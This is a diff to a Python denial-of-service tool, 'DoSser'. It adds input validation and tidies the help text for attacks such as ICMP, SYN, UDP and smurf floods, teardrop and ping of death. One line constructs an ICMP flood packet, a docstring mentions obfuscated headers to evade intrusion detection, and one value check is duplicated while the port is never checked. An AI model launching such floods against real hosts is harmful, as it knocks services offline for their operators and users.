@@ -32,9 +32,9 @@ def loadgraphic():
 
     startText = """
 [+] A denial of service tool designed for the lazy network tester. Zzzz.
-[+] V1.0 Designed by Joe Whalley
-[!] Please do not use this program for illegal or immoral purposes
-[?] Type "DoSSER --help for instructions
+[+] V1.0 Designed by Joe Whalley.
+[!] Please do not use this program for illegal or immoral purposes.
+[?] Type "DoSSER --help" for instructions.
     """
 
     print(Fore.GREEN + logo)
@@ -49,12 +49,14 @@ def argparser():
     # Create the parser object
     parser = argparse.ArgumentParser(
         prog='DoSser',
-        description='A tool designed by Joseph Whalley to preform a range of Denial of Service attacks against a target'
+        description='A tool designed by Joseph Whalley to preform a range of Denial of Service attacks against a '
+                    'target. '
     )
-    parser.add_argument("-t", "--target", required=True, type=str, help="Target IP address")
-    parser.add_argument("-p", "--port", required=True, type=int, help="Target Port")
+    parser.add_argument("-t", "--target", required=True, type=str, help="Target IP address.")
+    parser.add_argument("-p", "--port", required=True, type=int, help="Target Port. Must be a positive integer.")
     parser.add_argument("-th", "--threads", default=4, type=int,
-                        help="Amount of threads to use in an attack. Default 4")
+                        help="Amount of threads to use in an attack. Default 4. Must be a positive integer greater "
+                             "than 0.")
     parser.add_argument("-a", "--attack", required=True,
                         choices=['icmpflood', 'land', 'pingofdeath', 'tcppushack', 'tcpsyn', 'teardrop', 'udpflood',
                                  'smurf'], help='Choose the type of attack to perform on '
@@ -66,11 +68,14 @@ def argparser():
 
     # Time subparser
     time_parser = limit_subparsers.add_parser('time', help='Limit the attack by time')
-    time_parser.add_argument('value', type=int, help='Length of time to run the attack for. Set to 0 for infinite')
+    time_parser.add_argument('value', type=int,
+                             help='Length of time to run the attack for. Must be a positive integer. Set to 0 for '
+                                  'infinite.')
 
     # Packet subparser
-    packet_parser = limit_subparsers.add_parser('packet', help='Limit the amount of packets to send')
-    packet_parser.add_argument('value', type=int, help='Amount of packets to send in the attack per thread.')
+    packet_parser = limit_subparsers.add_parser('packet', help='Limit the amount of packets to send.')
+    packet_parser.add_argument('value', type=int,
+                               help='Amount of packets to send in the attack per thread. Must be a positive integer.')
 
     args = parser.parse_args()
 
@@ -83,9 +88,18 @@ def main():
     is the 'main' part of the code.
     Contains obfuscation in headers to help avoid detection by IDS software etc.
     """
-
-    loadgraphic()  # Output Loading graphic and text
     args = argparser()  # Get parsed arguments
+    loadgraphic()  # Output Loading graphic and text
+
+    # Value checks
+    if (args.value < 0) or args.value < 0:
+        print("[!] Invalid value set on Port or Limit value flag.")
+        sys.exit(0)
+
+    if args.threads < 1:
+        print("[!] Invalid value set on Threads flag.")
+        sys.exit(0)
+
     if args.attack == 'icmpflood':
         packet = IP(dst=args.target, id=random.randint(1, 10000), ttl=random.randint(32, 64)) / ICMP() / (
                 random.choice(string.ascii_uppercase + string.ascii_lowercase) * 64)
@@ -129,4 +143,6 @@ def main():
         sys.exit(1)
 
 
-main()
+if __name__ == "__main__":
+    # Call the main function
+    main()
